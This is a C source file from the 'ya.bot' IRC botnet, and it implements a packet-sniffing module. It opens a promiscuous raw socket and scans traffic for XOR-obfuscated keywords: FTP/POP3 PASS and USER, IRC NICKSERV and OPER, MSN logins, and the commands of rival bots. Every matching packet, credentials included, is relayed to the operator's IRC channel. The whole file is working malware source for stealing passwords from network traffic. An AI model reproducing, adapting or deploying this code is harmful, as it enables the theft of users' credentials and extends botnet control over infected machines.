/*  ya.bot  */

#include "bot.h"

#ifndef NO_PSNIFF
DWORD WINAPI psniff_main(LPVOID param)
{
	#define PTBOT "\x8B\x86\x9D" //BOT
	#define PTFTPPOP3 "\x8F\x9D\x99\xE6\x99\x86\x99\xFA" //FTP/POP3
	#define PTHTTP "\x81\x9D\x9D\x99" //HTTP
	#define PTIRC "\x80\x9B\x8A" //IRC
	#define PTMSN "\x84\x9A\x87" //MSN
	SPacketList rgSPacketList[] = 
	{
			{"\xF3\x6E\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:§login 
			{"\xF3\xE2\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:+login 
			{"\xF3\xE8\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:!login 
			{"\xF3\xEB\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:"login 
			{"\xF3\xEA\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:#login 
			{"\xF3\x6D\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:¤login 
			{"\xF3\xEC\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:%login 
			{"\xF3\xEF\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:&login 
			{"\xF3\xF4\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:=login 
			{"\xF3\xF6\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:?login 
			{"\xF3\x89\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:@login 
			{"\xF3\x6A\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:£login 
			{"\xF3\xED\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:$login 
			{"\xF3\x97\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:^login 
			{"\xF3\xB7\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:~login 
			{"\xF3\xE3\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:*login 
			{"\xF3\xE5\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:,login 
			{"\xF3\xE7\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:.login 
			{"\xF3\xE4\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:-login 
			{"\xF3\xB5\xA5\xA6\xAE\xA0\xA7\xE9", PTBOT}, //:|login 


			{"\xF3\x6E\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:§download 
			{"\xF3\xE2\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:+download 
			{"\xF3\xE8\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:!download 
			{"\xF3\xEB\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:"download 
			{"\xF3\xEA\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:#download 
			{"\xF3\x6D\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:¤download 
			{"\xF3\xEC\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:%download 
			{"\xF3\xEF\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:&download 
			{"\xF3\xF4\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:=download 
			{"\xF3\xF6\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:?download 
			{"\xF3\x89\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:@download 
			{"\xF3\x6A\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:£download 
			{"\xF3\xED\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:$download 
			{"\xF3\x97\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:^download 
			{"\xF3\xB7\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:~download 
			{"\xF3\xE3\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:*download 
			{"\xF3\xE5\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:,download 
			{"\xF3\xE7\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:.download 
			{"\xF3\xE4\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:-download 
			{"\xF3\xB5\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //:|download 
	
			{"\xF3\x6E\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:§update 
			{"\xF3\xE2\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:+update 
			{"\xF3\xE8\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:!update 
			{"\xF3\xEB\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:"update 
			{"\xF3\xEA\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:#update 
			{"\xF3\x6D\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:¤update 
			{"\xF3\xEC\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:%update 
			{"\xF3\xEF\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:&update 
			{"\xF3\xF4\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:=update 
			{"\xF3\xF6\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:?update 
			{"\xF3\x89\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:@update 
			{"\xF3\x6A\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:£update 
			{"\xF3\xED\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:$update 
			{"\xF3\x97\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:^update 
			{"\xF3\xB7\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:~update 
			{"\xF3\xE3\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:*update 
			{"\xF3\xE5\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:,update 
			{"\xF3\xE7\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:.update 
			{"\xF3\xE4\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:-update 
			{"\xF3\xB5\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //:|update 

			{"\xA1\xBD\xBD\xB9\xE7\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //http.download 
			{"\xA1\xBD\xBD\xB9\xE7\xAC\xB1\xAC\xAA\xBC\xBD\xAC\xE9", PTBOT}, //http.execute 
			{"\xA1\xBD\xBD\xB9\xE7\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //http.update 
			{"\xAF\xBD\xB9\xE7\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD\xE9", PTBOT}, //ftp.download 
			{"\xAF\xBD\xB9\xE7\xAC\xB1\xAC\xAA\xBC\xBD\xAC\xE9", PTBOT}, //ftp.execute 
			{"\xAF\xBD\xB9\xE7\xBC\xB9\xAD\xA8\xBD\xAC\xE9", PTBOT}, //ftp.update 
			{"\xBE\xAE\xAC\xBD\xE9", PTBOT}, //wget 

			{"\x99\x88\x9A\x9A\xE9",PTFTPPOP3}, //PASS 
			{"\x9C\x9A\x8C\x9B\xE9", PTFTPPOP3}, //USER 
//			{"\x9A\xAC\xBD\xE4\x8A\xA6\xA6\xA2\xA0\xAC", PTHTTP}, //Set-Cookie

			{"\x8A\x81\x88\x87\x9A\x8C\x9B\x9F", PTIRC}, //CHANSERV
			{"\x83\x86\x80\x87\xE9\xEA", PTIRC}, //JOIN #
			{"\x87\x80\x8A\x82\x9A\x8C\x9B\x9F", PTIRC}, //NICKSERV
			{"\x86\x99\x8C\x9B\xE9", PTIRC}, //OPER 

			{"\x83\x86\x80\xE9", PTMSN}, //JOI 
			{"\x9C\x9A\x9B\xE9", PTMSN}, //USR 
			{NULL, NULL}
	};
	char *pszPacket, szRawData[65535];
	DWORD dwReturn;
	int i, j, nValue = 1;
	IN_ADDR ia;
	IPHEADER *iphdr;
	sockaddr_in sin;
	SOCKET sock;
	SPacketSniffer s_ps = *((SPacketSniffer *)param);
	TCPHEADER *tcphdr;

#ifndef NO_DEBUG
		debug_print("Starting to sniff packets, psniff_main()");
#endif	

		sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_IP, NULL, 0, WSA_FLAG_OVERLAPPED);
	if (sock == INVALID_SOCKET)
	{
		if ((!s_ps.m_bSilent) && (s_ps.m_bVerbose))
				irc_message(s_ps.m_bsock, s_ps.m_szAction, s_ps.m_szDestination,
						(char *)string_psniffailed,
						CRED, string_replypsniff, CEND, string_replydotbot);
			thread_remove(THREAD_PSNIFF);
			return 0;
	}
		sin.sin_addr.s_addr = inet_addr(ip_getip(s_ps.m_bsock));
		sin.sin_family = AF_INET;
		sin.sin_port = 0;
	if (bind(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
			closesocket(sock);
		if ((!s_ps.m_bSilent) && (s_ps.m_bVerbose))
				irc_message(s_ps.m_bsock, s_ps.m_szAction, s_ps.m_szDestination,
						(char *)string_psniffailed,
						CRED, string_replypsniff, CEND, string_replydotbot);
			thread_remove(THREAD_PSNIFF);
			return 0;
	}
	if (WSAIoctl(sock,
				SIO_RCVALL,
				&nValue,
				sizeof(nValue),
				NULL,
				0,
				&dwReturn,
				NULL,
				NULL) == SOCKET_ERROR)
	{
			closesocket(sock);
		if ((!s_ps.m_bSilent) && (s_ps.m_bVerbose))
				irc_message(s_ps.m_bsock, s_ps.m_szAction, s_ps.m_szDestination,
						(char *)string_psniffailed,
						CRED, string_replypsniff, CEND, string_replydotbot);
			thread_remove(THREAD_PSNIFF);
			return 0;
	}
	if ((!s_ps.m_bSilent) && (s_ps.m_bVerbose))
			irc_message(s_ps.m_bsock, s_ps.m_szAction, s_ps.m_szDestination,
					(char *)string_psniffstarted,
					CBLUE, string_replypsniff, CEND, string_replydotbot);
	while (TRUE)
	{
			memset(szRawData, 0, sizeof(szRawData));
		if (recv(sock, szRawData, sizeof(szRawData) - 1, 0) == SOCKET_ERROR)
				break;
			iphdr = (IPHEADER *)szRawData;
		if (iphdr->proto == 6)
		{
				ia.S_un.S_addr = iphdr->sourceIP;
				tcphdr = (TCPHEADER *)szRawData;
				pszPacket = (char *)szRawData + sizeof(*iphdr) + sizeof(*tcphdr);
			if (!stristr(pszPacket, string_replydotbot))
			{
				for (i = 0; i < ARRAYSIZE(rgSPacketList); i++)
				{
					if (!rgSPacketList[i].m_pszText)
							break;
						crypto_xor(rgSPacketList[i].m_pszText, xorkey);
					if (stristr(pszPacket, rgSPacketList[i].m_pszText))
					{
							crypto_xor(rgSPacketList[i].m_pszPacketType, xorkey);
						for (j = 0; j < (int)strlen(pszPacket); j++)
							if ((pszPacket[j] == '\r') || (pszPacket[j] == '\n'))
									pszPacket[j] = '\x20';
							Sleep(FLOOD_DELAY);
						if (!s_ps.m_bSilent)
								irc_message(s_ps.m_bsock,
										(char *)string_ircprivmsg, s_ps.m_szResultChannel,
										(char *)string_psniffpacket,
										CGREEN, string_replypsniff, CEND, string_replydotbot,
										CBLUE, CEND, rgSPacketList[i].m_pszPacketType,
										CBLUE, CEND, inet_ntoa(ia), ntohs(tcphdr->th_sport),
										pszPacket);
							Sleep(FLOOD_DELAY);
							crypto_xor(rgSPacketList[i].m_pszPacketType, xorkey);
							crypto_xor(rgSPacketList[i].m_pszText, xorkey);
							break;
					}
						crypto_xor(rgSPacketList[i].m_pszText, xorkey);
				}
			}
		}
	}
		closesocket(sock);
	if ((!s_ps.m_bSilent) && (s_ps.m_bVerbose))
			irc_message(s_ps.m_bsock, s_ps.m_szAction, s_ps.m_szDestination,
					(char *)string_psniffailed,
					CRED, string_replypsniff, CEND, string_replydotbot);
		thread_remove(THREAD_PSNIFF);
		return 0;
}
#endif